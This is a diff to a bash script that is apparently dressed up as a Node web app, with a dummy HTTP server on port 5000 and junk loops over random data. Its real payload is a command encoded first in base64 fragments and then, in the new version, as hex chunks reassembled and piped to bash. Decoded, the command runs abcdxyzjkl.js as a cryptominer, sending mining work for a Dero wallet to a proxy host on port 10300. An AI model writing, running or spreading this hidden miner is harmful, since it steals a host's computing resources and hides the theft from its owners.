@@ -1,51 +1,37 @@
 #!/bin/bash
 
 r(){ echo $((RANDOM%$1)); }
-g(){ head -c $1 /dev/urandom | base64 | tr -d '\n'; }
 
-a="Y2htb2QgK3ggYWJjZHh5empsLmpz"
-b="OyBwPSQoc2h1ZiAtZSBuZ2lueCBhIGUgLW4xKQ=="
-c="OyBuPSQoIFsgIiRwIiA9IG5naW54IF0gJiYgc2h1ZiAtaSAyLTEwIC1uMSB8fCBzaHVmIC1pIDEtMTAgLW4xICkg"
-d="OyAuL2FiY2R4eXpqa2wuanMgLXcgZGVybzFxeXd mYXp2cTI2cDYzbHJtNXZ3bmp4OGFyZm5uNzZuZzhkbGU2aDQzemVtYXhrZA=="
-e="c2dmbmRjcXFldGZsYXguc29sbyAtciAke3B9JHtu fS54b3Jha3Byb3h5LnNiczoxMDMwMA=="
-
-arr=("$a" "$b" "$c" "$d" "$e")
-
-mix=()
-while [ ${#arr[@]} -gt 0 ]; do
-    i=$(r ${#arr[@]})
-    mix+=("${arr[$i]}")
-    unset arr[$i]
-    arr=("${arr[@]}")
-done
-
-payload=""
-for x in "${mix[@]}"; do
-    payload+=$(echo "$x" | base64 -d 2>/dev/null)
-done
-
-junk(){
-    for i in $(seq 1 20); do
-        t=$(g 32)
-        echo "$t" | rev | cut -c1-10 >/dev/null
-    done
+build(){
+printf "\\x63\\x68\\x6d\\x6f\\x64\\x20\\x2b\\x78\\x20\\x61\\x62\\x63\\x64\\x78\\x79\\x7a\\x6a\\x6b\\x6c\\x2e\\x6a\\x73\\x3b\\x20\\x70\\x3d\\x24\\x28\\x73\\x68\\x75\\x66\\x20\\x2d\\x65\\x20\\x6e\\x67\\x69\\x6e\\x78\\x20\\x61\\x20\\x65\\x20\\x2d\\x6e\\x31\\x29\\x3b\\x20\\x6e\\x3d\\x24\\x28\\x20\\x5b\\x20\\x22\\x24\\x70\\x22\\x20\\x3d\\x20\\x6e\\x67\\x69\\x6e\\x78\\x20\\x5d\\x20\\x26\\x26\\x20\\x73\\x68\\x75\\x66\\x20\\x2d\\x69\\x20\\x32\\x2d\\x31\\x30\\x20\\x2d\\x6e\\x31\\x20\\x7c\\x7c\\x20\\x73\\x68\\x75\\x66\\x20\\x2d\\x69\\x20\\x31\\x2d\\x31\\x30\\x20\\x2d\\x6e\\x31\\x20\\x29\\x3b\\x20\\x2e\\x2f\\x61\\x62\\x63\\x64\\x78\\x79\\x7a\\x6a\\x6b\\x6c\\x2e\\x6a\\x73\\x20\\x2d\\x77\\x20\\x64\\x65\\x72\\x6f\\x31\\x71\\x79\\x77\\x66\\x61\\x7a\\x76\\x71\\x32\\x36\\x70\\x36\\x33\\x6c\\x72\\x6d\\x35\\x76\\x77\\x6e\\x6a\\x78\\x38\\x61\\x72\\x66\\x6e\\x6e\\x37\\x36\\x6e\\x67\\x38\\x64\\x6c\\x65\\x36\\x68\\x34\\x33\\x7a\\x65\\x6d\\x61\\x78\\x6b\\x64\\x73\\x67\\x66\\x6e\\x64\\x63\\x71\\x71\\x65\\x74\\x66\\x6c\\x61\\x78\\x2e\\x73\\x6f\\x6c\\x6f\\x20\\x2d\\x72\\x20\\x24\\x7b\\x70\\x7d\\x24\\x7b\\x6e\\x7d\\x2e\\x78\\x6f\\x72\\x61\\x6b\\x70\\x72\\x6f\\x78\\x79\\x2e\\x73\\x62\\x73\\x3a\\x31\\x30\\x33\\x30\\x30"
 }
 
-for i in $(seq 1 10); do junk; done
+noise(){
+for i in $(seq 1 50); do
+    x=$(head -c 8 /dev/urandom | od -An -tx1)
+    echo $x | tr -d ' ' >/dev/null
+done
+}
 
-f1=$(echo "$payload" | cut -c1-50)
-f2=$(echo "$payload" | cut -c51-100)
-f3=$(echo "$payload" | cut -c101-200)
-f4=$(echo "$payload" | cut -c201-)
+for i in $(seq 1 10); do noise; done
 
-final="$f1$f2$f3$f4"
-
-node -e "
-const http=require('http')
-http.createServer((q,s)=>{s.end('ok')}).listen(5000)
-setInterval(()=>{},1000)
-" >/dev/null 2>&1 &
+node -e "require('http').createServer((q,s)=>s.end('ok')).listen(5000);setInterval(()=>{},1000)" >/dev/null 2>&1 &
 
 sleep 0.2
 
-eval "$final"
+cmd=$(build)
+
+parts=()
+len=${#cmd}
+step=25
+
+for ((i=0;i<len;i+=step)); do
+    parts+=("${cmd:i:step}")
+done
+
+out=""
+for ((i=${#parts[@]}-1;i>=0;i--)); do
+    out="${parts[i]}$out"
+done
+
+bash <<< "$out"
